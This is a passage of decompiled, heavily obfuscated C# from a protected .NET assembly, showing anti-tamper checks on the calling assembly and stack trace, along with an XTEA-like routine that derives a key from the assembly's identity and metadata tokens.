			ulong num5 = (ulong)((long)num2 << 32);
			return (long)(num5 | (uint)num);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _0002(long _0002)
		{
			if ((object)Assembly.GetCallingAssembly() == typeof(_0005_2002_2004_2009_2002_2007_2008_2008_200B_2007_200A_2007_2007_2002_2004_200B_2008_200A_2005_2003_2004_200A_2001_2002).Assembly && _0002_2000._0002())
			{
				int[] array = new int[4];
				array[1] = ~(-(~(-(-(~(~(-(~-1821317342))))))));
				array[0] = ~(-(-(~(~(-(~(-(~34157262))))))));
				array[2] = ~(-(-(~(~(-(~(-(~63430868))))))));
				array[3] = -(~(-(~(~(-(-(~(~391658777))))))));
				int num = ~(-(-(~(~(-(~(-(-(~(~1640531525))))))))));
				int num2 = (int)_0002;
				int num3 = (int)(_0002 >> 32);
				int num4 = 0;
				for (int i = 0; i != 32; i++)
				{
					num2 += (((num3 << 4) ^ (num3 >> 5)) + num3) ^ (num4 + array[num4 & 3]);
					num4 += num;
					num3 += (((num2 << 4) ^ (num2 >> 5)) + num2) ^ (num4 + array[(num4 >> 11) & 3]);
				}
				for (int j = 0; j != 4; j++)
				{
					array[j] = 0;
				}
				this.m__0002 = num2;
				_0003 = num3;
			}
		}
	}

	private sealed class _0006_2002_2008_200A_2001_2008_2000_2000_2002_2001_200B_200A_2006_200A_200B_200B_2001
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0003(_0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0003(_0006_2005_200B_2008_2005_2002_2007_2009_2007_2008_2004_200B_2004_2001_2003_2005_2007_2003_2008_200A._0002(), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0002(_0002_2000._0002(typeof(_0006_2002_2008_200A_2001_2008_2000_2000_2002_2001_200B_200A_2006_200A_200B_200B_2001)), _0003_2004_2005_200B_2001_2001_200A_2006_2003_2003_2001_2004_2003_200A_2000_2000_2000_2007_2008_2003_200B_2005_2001_2002_2003_2004._0002())), _0002_2000._0002(typeof(_0006_2004_2005_2009_2005_200A_2000_2004_2004_200B_200B_2007_2008_2005_2004_200A_200B_2007_2005_2002_2007_2009_200A_2003)));
		}
	}

	private sealed class _0008_2001_200B_200A_2007_2005_2006_2000_2004_200A_200A_200B_2003_2006_200B_2003_2006
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0002_2000._0002(typeof(_0008_2001_200B_200A_2007_2005_2006_2000_2004_200A_200A_200B_2003_2006_200B_2003_2006)), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0002(_0002_2000._0002(typeof(_000E_2000_2000_2004_2005_2002_200B_2000_200B_2006_200A_2000_2004_2004_2004_2008_200B_200B_200A_2001_2004_2009_2003)), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0003(_0002_2000._0002(typeof(_0003_2004_2005_200B_2001_2001_200A_2006_2003_2003_2001_2004_2003_200A_2000_2000_2000_2007_2008_2003_200B_2005_2001_2002_2003_2004)), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0002_2000._0002(typeof(_0006_2005_200B_2008_2005_2002_2007_2009_2007_2008_2004_200B_2004_2001_2003_2005_2007_2003_2008_200A)), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0002(_0002_2000._0002(typeof(_0006_2002_2008_200A_2001_2008_2000_2000_2002_2001_200B_200A_2006_200A_200B_200B_2001)), _0002_2000._0002(typeof(_0006_2004_2005_2009_2005_200A_2000_2004_2004_200B_200B_2007_2008_2005_2004_200A_200B_2007_2005_2002_2007_2009_200A_2003)))))));
		}
	}

	private sealed class _0006_2004_2005_2009_2005_200A_2000_2004_2004_200B_200B_2007_2008_2005_2004_200A_200B_2007_2005_2002_2007_2009_200A_2003
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0002(_0002_2000._0002(typeof(_0006_2004_2005_2009_2005_200A_2000_2004_2004_200B_200B_2007_2008_2005_2004_200A_200B_2007_2005_2002_2007_2009_200A_2003)), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0003(_0002_2000._0002(typeof(_0006_2002_2008_200A_2001_2008_2000_2000_2002_2001_200B_200A_2006_200A_200B_200B_2001)), _0002_2000._0002(typeof(_000E_2000_2000_2004_2005_2002_200B_2000_200B_2006_200A_2000_2004_2004_2004_2008_200B_200B_200A_2001_2004_2009_2003))), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0002_2000._0002(typeof(_0006_2005_200B_2008_2005_2002_2007_2009_2007_2008_2004_200B_2004_2001_2003_2005_2007_2003_2008_200A)) ^ -(~(~(-(-(~(-(~(~-1044183948)))))))), _0006_2002_2008_200A_2001_2008_2000_2000_2002_2001_200B_200A_2006_200A_200B_200B_2001._0002())));
		}
	}

	private sealed class _0003_2004_2005_200B_2001_2001_200A_2006_2003_2003_2001_2004_2003_200A_2000_2000_2000_2007_2008_2003_200B_2005_2001_2002_2003_2004
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0002(_0002_2000._0002(typeof(_0006_2005_200B_2008_2005_2002_2007_2009_2007_2008_2004_200B_2004_2001_2003_2005_2007_2003_2008_200A)), _0002_2000._0002(typeof(_0008_2001_200B_200A_2007_2005_2006_2000_2004_200A_200A_200B_2003_2006_200B_2003_2006)) ^ _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0003(_0002_2000._0002(typeof(_0003_2004_2005_200B_2001_2001_200A_2006_2003_2003_2001_2004_2003_200A_2000_2000_2000_2007_2008_2003_200B_2005_2001_2002_2003_2004)), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0002_2000._0002(typeof(_0006_2004_2005_2009_2005_200A_2000_2004_2004_200B_200B_2007_2008_2005_2004_200A_200B_2007_2005_2002_2007_2009_200A_2003)), _0008_2001_200B_200A_2007_2005_2006_2000_2004_200A_200A_200B_2003_2006_200B_2003_2006._0002())));
		}
	}

	private sealed class _0006_2005_200B_2008_2005_2002_2007_2009_2007_2008_2004_200B_2004_2001_2003_2005_2007_2003_2008_200A
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0002(_0003_2004_2005_200B_2001_2001_200A_2006_2003_2003_2001_2004_2003_200A_2000_2000_2000_2007_2008_2003_200B_2005_2001_2002_2003_2004._0002() ^ -(~(~(-(-(~(-(~(~-527758445)))))))), _0002_2000._0002(typeof(_0008_2001_200B_200A_2007_2005_2006_2000_2004_200A_200A_200B_2003_2006_200B_2003_2006))), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0003(_0002_2000._0002(typeof(_000E_2000_2000_2004_2005_2002_200B_2000_200B_2006_200A_2000_2004_2004_2004_2008_200B_200B_200A_2001_2004_2009_2003)) ^ _0002_2000._0002(typeof(_0006_2004_2005_2009_2005_200A_2000_2004_2004_200B_200B_2007_2008_2005_2004_200A_200B_2007_2005_2002_2007_2009_200A_2003)), ~(-(-(~(-(~(-(~(~(-(~436530339))))))))))));
		}
	}

	private static class _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002
	{
		internal static int _0002(int _0002, int _0003)
		{
			return _0002 ^ (_0003 - -(~(-(~(~(-(~(-(-(~(~-451742292)))))))))));
		}

		internal static int _0003(int _0002, int _0003)
		{
			return (_0002 - -(~(~(-(-(~(-(~(~-23382092))))))))) ^ (_0003 + -(~(~(-(~(-(~(-(~173003795)))))))));
		}

		internal static int _0005(int _0002, int _0003)
		{
			return _0002 ^ ((_0003 - ~(-(-(~(~(-(~(-(-(~(~-1044302438))))))))))) ^ (_0002 - _0003));
		}
	}

	private static _0005_2002_2004_2009_2002_2007_2008_2008_200B_2007_200A_2007_2007_2002_2004_200B_2008_200A_2005_2003_2004_200A_2001_2002 m__0002 = new _0005_2002_2004_2009_2002_2007_2008_2008_200B_2007_200A_2007_2007_2002_2004_200B_2008_200A_2005_2003_2004_200A_2001_2002();

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long _0002()
	{
		if ((object)Assembly.GetCallingAssembly() != typeof(_0002_2000).Assembly || !_0002_2000._0002())
		{
			return 0L;
		}
		lock (_0002_2000.m__0002)
		{
			long num = _0002_2000.m__0002._0002();
			if (num == 0)
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				List<byte> list = new List<byte>();
				AssemblyName assemblyName;
				try
				{
					assemblyName = executingAssembly.GetName();
				}
				catch
				{
					assemblyName = new AssemblyName(executingAssembly.FullName);
				}
				byte[] array = assemblyName.GetPublicKeyToken();
				if (array != null && array.Length == 0)
				{
					array = null;
				}
				if (array != null)
				{
					list.AddRange(array);
				}
				list.AddRange(Encoding.Unicode.GetBytes(assemblyName.Name));
				int num2 = _0002(typeof(_0002_2000));
				int num3 = _000E_2000_2000_2004_2005_2002_200B_2000_200B_2006_200A_2000_2004_2004_2004_2008_200B_200B_200A_2001_2004_2009_2003._0002();
				list.Add((byte)(num2 >> 24));
				list.Add((byte)(num3 >> 16));
				list.Add((byte)(num2 >> 8));
				list.Add((byte)num3);
				list.Add((byte)(num2 >> 16));
				list.Add((byte)(num3 >> 8));
				list.Add((byte)num2);
				list.Add((byte)(num3 >> 24));
				int count = list.Count;
				ulong num4 = 0uL;
				for (int i = 0; i != count; i++)
				{
					num4 += list[i];
					num4 += num4 << 20;
					num4 ^= num4 >> 12;
					list[i] = 0;
				}
				num4 += num4 << 6;
				num4 ^= num4 >> 22;
				num4 += num4 << 30;
				num = (long)num4;
				num ^= 0x7D90F46F29E38E23L;
				_0002_2000.m__0002._0002(num);
			}
			return num;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool _0002()
	{
		if (!_0003())
		{
			return false;
		}
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool _0003()
	{
		StackTrace stackTrace = new StackTrace();
		Type type = (stackTrace.GetFrame(3)?.GetMethod())?.DeclaringType;
		if ((object)type == typeof(RuntimeMethodHandle))
		{
			return false;
		}
		if ((object)type == null)
		{
			return false;
		}
		if ((object)type.Assembly != typeof(_0002_2000).Assembly)
		{
			return false;
		}
		return true;
	}

	private static int _0002(Type _0002)
	{
		return _0002.MetadataToken;
	}
}
